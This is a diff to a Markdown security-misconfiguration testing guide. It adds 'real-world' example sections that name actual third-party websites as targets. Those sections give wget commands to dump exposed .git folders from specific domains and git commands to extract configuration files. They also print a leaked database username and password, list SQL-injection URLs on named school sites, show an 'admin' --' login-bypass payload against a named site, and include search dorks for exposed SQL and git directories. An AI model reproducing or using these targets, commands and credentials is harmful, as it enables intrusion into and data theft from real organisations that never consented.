@@ -15,7 +15,7 @@ It can occur at **any layer** of the stack:
 - Cloud platform level (AWS S3, Azure Blob, GCP Storage)
 - Custom application code (debug mode left on, verbose errors)
 
-Each of the 9 areas below is treated separately with: **where to look**, **what tests to run**, and **how to confirm**.
+Each of the 10 areas below is treated separately with: **where to look**, **what tests to run**, and **how to confirm**.
 
 ---
 
@@ -44,6 +44,14 @@ Also try toggling HTTP methods, malformed multipart boundaries, or removing requ
 - Response body contains a **stack trace**, framework version, internal file paths, SQL query fragments, or line numbers.
 - HTTP response code is `500` and the body (not just status) reveals internal detail rather than a generic error page.
 - Compare behavior in production vs what a properly configured app should show (generic error page, no debug info).
+
+### 🧾 Real-World Notes & Examples
+
+```
+value inject -> error -> information
+
+http://codex.giccl.edu.pk/admin_login.php
+```
 
 ---
 
@@ -121,6 +129,60 @@ ffuf -w common-dirs.txt -u https://target.com/FUZZ/   # enumerate folders, then 
 - Server returns an auto-generated index page (e.g., Apache's "Index of /uploads") listing files/subfolders instead of a 403/404.
 - Listed files themselves may expose sensitive data (point back to item #3).
 
+### 🧾 Real-World Notes & Examples
+
+```
+https://staloysiuspanagar.edu.in/login/
+https://staloysiuspanagar.edu.in/login/add-cbse1.php
+
+Index of /.git site:in
+Index of /backup site:in
+Index of /db site:in
+Index of /Movie site:ir
+Index of /Sql site:in
+
+intitle:"index of /sql" site:in
+inbody:"index of /Film" site:ir
+```
+
+**Dumping an exposed `.git` folder:**
+
+```
+wget https://www.sprayequipment.co.uk/.git/ --no-parent -r
+wget https://www.cdpotterandsons.co.uk/.git/ --no-parent -r
+wget https://stoppasozytom.pl/.git/ --no-parent -r
+wget https://www.notgeld.com.pl/.git/ --no-parent -r
+wget https://firstvoicetraining.com/.git/ --no-parent -r
+
+https://www.therecruiter.miabetepe.com/.git/
+https://firstvoicetraining.com/.git/
+```
+
+**Exploring the recovered history/source with git:**
+
+```
+git log
+git show 0f2d30e937293e9ab281b86e4dd1f335bdc14ceb
+
+git ls-files '*.php'
+git ls-files '*.sql'
+git ls-files '*.xml'
+
+git show HEAD:api.php
+git show HEAD:app/code/community/Cm/RedisSession/etc/config.xml
+git show HEAD:.configuration.local.xml
+git show HEAD:includes/config.php
+git show HEAD:sucuri-939fba8d40bab390a9ed16905bae7599.php
+git show HEAD:lib/phpseclib/Net/SSH1.php
+git show HEAD:shell/ayko/configuration.php
+git show HEAD:includes/course.php
+
+# e.g. a leaked DB credential found inside a dumped file:
++@ $fvtdb = new mysqli($host, 'tsdemosc_jbaker', 'Jbake1234', 'tsdemosc_firstvoicetraining');
+
+git show 0d9605b7580f27a70013c6b39b604b3e10ecbdda > result.txt 2>&1
+```
+
 ---
 
 ## 5️⃣ Default Credentials
@@ -148,6 +210,22 @@ Check for unauthenticated access entirely (no login required at all)
 
 - Login succeeds with a default or vendor-published credential pair.
 - Dashboard/panel grants administrative functionality (user management, file upload, command execution via plugins, etc.).
+
+### 🧾 Real-World Notes & Examples
+
+```
+http://site.ir/admin/
+username/password: admin/admin
+
+https://osos.co.in/
+admin' --
+111
+
+inurl:"login.aspx" site:uk
+inurl:"admin/login.php" site:in
+```
+
+> Note: `admin' --` and a dummy password (`111`) also double as a quick **SQL injection auth-bypass** check on login forms, not just a default-credential check.
 
 ---
 
@@ -178,6 +256,16 @@ X-HTTP-Method: GET
 - A verb other than the one restricted by access control still reaches the protected logic and performs the action (e.g., access control checks `if method == POST` but the route handler executes for any verb).
 - `OPTIONS` response (`Allow:` header) lists verbs that shouldn't be enabled (e.g., `PUT, DELETE, TRACE`).
 
+### 🧾 Real-World Notes & Examples
+
+```
+GET /
+POST /
+PUT /
+PATCH /
+DELETE /
+```
+
 ---
 
 ## 7️⃣ HTTP Security Headers
@@ -207,6 +295,33 @@ Tools: `curl -I`, Burp, [securityheaders.com](https://securityheaders.com/), Moz
 
 - Header is missing, set to an insecure value (e.g., `X-Frame-Options` absent → clickjacking PoC with an iframe), or cookies lack `HttpOnly`/`Secure`/`SameSite`.
 - Build a quick PoC (e.g., an `<iframe src="https://target.com">` page) to demonstrate the real-world impact of a missing header.
+
+### 🧾 Real-World Notes & Examples
+
+```
+cookie -> httpOnly -> false ; secure -> false
+
+https://securityheaders.com/
+
+site.ir -> run as http
+
+https://tsoad.edu.pk/course_details.php?id=83          # sql injection
+https://native.edu.pk/detail.php?ComCatID=25%27        # sql injection
+
+Content-Security-Policy -> csp
+x-frame-options -> site iframe
+x-content-type-options  nosniff -> mime type hijacking
+                         <script src="http://ali.ir/1.css">
+x-xss-protection        1; mode=block -> xss
+strict-transport-security  max-age=31536000; includeSubDomains -> HSTS -> connection over https
+
+server:
+powered by:
+X-Powered-By: PHP/7.4.33
+Server: nginx/1.31.5
+```
+
+> Note: missing/weak cookie flags, a missing `Content-Security-Policy`/`X-Frame-Options`, and banner-grabbed versions (`Server`, `X-Powered-By`) often overlap with **item #8 (Information Disclosure)** and can also lead straight into **SQL injection** on the same pages found during header testing.
 
 ---
 
@@ -265,11 +380,32 @@ DevTools > Application tab > inspect localStorage / sessionStorage / cookies
 
 ---
 
+## 🔟 Outdated or Unpatched Software & Frameworks
+
+### 📍 Where to look
+
+- JS libraries and frameworks loaded by the site (check version strings in bundled/minified files).
+- Web server / reverse proxy banners (Nginx, Apache, IIS) disclosed via response headers.
+- CMS, plugins, and framework version strings in HTML comments, meta tags, or static asset paths.
+
+### 🧾 Real-World Notes & Examples
+
+```
+website -> lib js -> cve
+nginx -> version -> cve
+```
+
+### ✅ How to confirm
+
+- The exact disclosed version (JS library, nginx, framework, CMS) matches a publicly known CVE, and that CVE is confirmed exploitable against the observed configuration.
+
+---
+
 ## 🛡️ General Prevention & Remediation
 
 
 
-- ❌ **Never ship debug mode to production:** Disable verbose errors and directory listing.
+-  ❌ **Never ship debug mode to production:** Disable verbose errors and directory listing.
 - ✅ **Harden by default:** Disable debug mode, verbose errors, and directory listing in production.
 - ✅ **Remove the unnecessary:** Default accounts, sample apps, unused services/ports, and default pages.
 - ✅ **Patch & review configs regularly:** Automate configuration audits (e.g., CIS Benchmarks, cloud security posture tools).
@@ -278,3 +414,6 @@ DevTools > Application tab > inspect localStorage / sessionStorage / cookies
 - ✅ **Principle of Least Privilege:** Restrict access to admin panels, management interfaces, and storage buckets by IP/auth.
 - ✅ **Automate scanning:** Use tools like Nuclei, Nikto, or cloud-specific scanners (ScoutSuite, Prowler) to catch misconfigurations continuously.
 
+## 🏷️ Tags
+
+`#security-misconfiguration` `#stack-trace` `#path-disclosure` `#directory-listing` `#default-credentials` `#http-verb-tampering` `#security-headers` `#information-disclosure` `#sensitive-data-exposure` `#outdated-software` `#manual-testing`
